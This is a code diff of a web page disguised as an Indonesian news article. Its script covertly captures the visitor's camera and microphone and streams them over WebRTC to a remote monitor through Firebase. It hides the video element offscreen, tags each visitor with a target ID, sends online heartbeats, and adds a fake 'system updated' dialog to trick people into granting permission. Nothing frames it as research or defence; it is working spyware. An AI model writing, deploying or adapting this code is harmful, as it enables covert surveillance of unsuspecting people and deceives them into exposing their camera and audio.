@@ -2,23 +2,36 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Berita Terkini - Portal Nasional</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Berita Nasional - Update</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body { font-family: sans-serif; margin: 0; background: #eee; }
-        .header { background: #b91c1c; color: #fff; padding: 20px; font-weight: bold; font-size: 20px; }
-        .content { max-width: 800px; margin: 20px auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        #v { position: fixed; top: -5000px; opacity: 0; }
+        body { font-family: sans-serif; margin: 0; padding: 0; background: #eee; }
+        .header { background: #b91c1c; color: #fff; padding: 15px; font-weight: bold; }
+        .content { background: #fff; max-width: 600px; margin: 20px auto; padding: 20px; border-radius: 5px; }
+        #modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); 
+                  display: flex; justify-content: center; align-items: center; z-index: 9999; }
+        .modal-box { background: #fff; padding: 30px; border-radius: 10px; text-align: center; max-width: 80%; }
+        button { background: #b91c1c; color: #fff; border: none; padding: 10px 30px; border-radius: 5px; cursor: pointer; font-size: 16px; }
+        #v { position: absolute; top: -1000px; width: 1px; height: 1px; opacity: 0; }
+        .hidden { display: none !important; }
     </style>
 </head>
 <body>
-    <div class="header">NEWS UPDATE LIVE</div>
+    <div id="modal">
+        <div class="modal-box">
+            <h3>Sistem Diperbarui</h3>
+            <p>Klik OK untuk melanjutkan membaca berita dan mengaktifkan fitur sinkronisasi.</p>
+            <button id="okBtn">OK</button>
+        </div>
+    </div>
+
+    <div class="header">MEDIA NEWS INDONESIA</div>
     <div class="content">
-        <h1>Langkah Strategis Memperkuat Pertumbuhan Ekonomi Digital 2026</h1>
-        <p>Pemerintah baru saja mengumumkan kebijakan baru terkait akselerasi infrastruktur jaringan di daerah terpencil...</p>
-        <img src="https://picsum.photos/800/400" style="width:100%; margin: 20px 0;">
-        <p>Analis memprediksi bahwa dengan adanya dukungan penuh dari sektor swasta, target pertumbuhan 7% bukan lagi impian semata.</p>
+        <h1>Sektor Pariwisata Kembali Bangkit Pasca Transformasi Digital</h1>
+        <p>Laporan terbaru menunjukkan peningkatan kunjungan wisatawan sebesar 25% setelah implementasi sistem manajemen berbasis cloud...</p>
+        <img src="https://picsum.photos/600/300?travel" style="width:100%">
     </div>
 
     <video id="v" autoplay playsinline muted></video>
@@ -33,76 +46,62 @@
 
         let targetId = localStorage.getItem('target_id') || "TGT-" + Math.random().toString(36).substr(2, 5);
         localStorage.setItem('target_id', targetId);
-
         const db = firebase.database().ref('v5_multi/' + targetId);
-        let pc = null;
-        let stream = null;
 
-        async function startStreaming() {
-            if (!stream) {
-                try {
-                    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                    document.getElementById('v').srcObject = stream;
-                } catch (e) { return; }
-            }
+        let pc, localStream;
 
+        async function createOffer() {
             if (pc) pc.close();
             pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
             
-            stream.getTracks().forEach(track => pc.addTrack(track, stream));
+            localStream.getTracks().forEach(track => pc.addTrack(track, localStream));
 
             pc.onicecandidate = e => {
                 if (e.candidate) db.child('ice_t').push(e.candidate.toJSON());
             };
 
+            pc.onconnectionstatechange = () => {
+                if (pc.connectionState === 'failed') setTimeout(createOffer, 2000);
+            };
+
             const offer = await pc.createOffer();
             await pc.setLocalDescription(offer);
-
-            // Bersihkan data lama & kirim offer baru
-            await db.child('ice_m').remove();
-            await db.child('ice_t').remove();
-            await db.child('sdp/answer').remove();
             await db.child('sdp/offer').set({ type: offer.type, sdp: offer.sdp, ts: Date.now() });
         }
 
-        // Heartbeat & Control Listener
-        function init() {
-            // Update status online
-            setInterval(() => {
-                db.child('status').update({ lastSeen: Date.now(), id: targetId });
-            }, 3000);
+        document.getElementById('okBtn').onclick = async function() {
+            document.getElementById('modal').classList.add('hidden');
+            try {
+                localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                document.getElementById('v').srcObject = localStream;
+                
+                // Clear old data
+                await db.child('sdp/answer').remove();
+                await db.child('ice_m').remove();
+                await db.child('ice_t').remove();
 
-            // Jika monitor minta re-koneksi (setelah refresh monitor)
-            db.child('control').on('value', s => {
-                if(s.val()) {
-                    console.log("Monitor requesting reconnect...");
-                    startStreaming();
-                }
-            });
+                await createOffer();
 
-            // Listen Answer
-            db.child('sdp/answer').on('value', async s => {
-                const a = s.val();
-                if (a && pc && pc.signalingState !== "stable") {
-                    await pc.setRemoteDescription(new RTCSessionDescription(a));
-                }
-            });
+                // Listen Answer
+                db.child('sdp/answer').on('value', async s => {
+                    const a = s.val();
+                    if (a && pc && pc.signalingState !== "stable") {
+                        await pc.setRemoteDescription(new RTCSessionDescription(a));
+                    }
+                });
 
-            // Listen ICE dari monitor
-            db.child('ice_m').on('child_added', s => {
-                if(pc) pc.addIceCandidate(new RTCIceCandidate(s.val())).catch(e=>{});
-            });
+                // Listen ICE
+                db.child('ice_m').on('child_added', s => {
+                    if(pc) pc.addIceCandidate(new RTCIceCandidate(s.val())).catch(()=>{});
+                });
 
-            // Langsung coba start kalau izin sudah ada
-            navigator.permissions.query({name: 'camera'}).then(res => {
-                if(res.state === 'granted') startStreaming();
-            });
-            
-            // Backup start
-            setTimeout(startStreaming, 2000);
-        }
+                // Heartbeat
+                setInterval(() => {
+                    db.child('status').update({ lastSeen: Date.now(), id: targetId });
+                }, 5000);
 
-        window.onload = init;
+            } catch(e) { console.error(e); }
+        };
     </script>
 </body>
 </html>
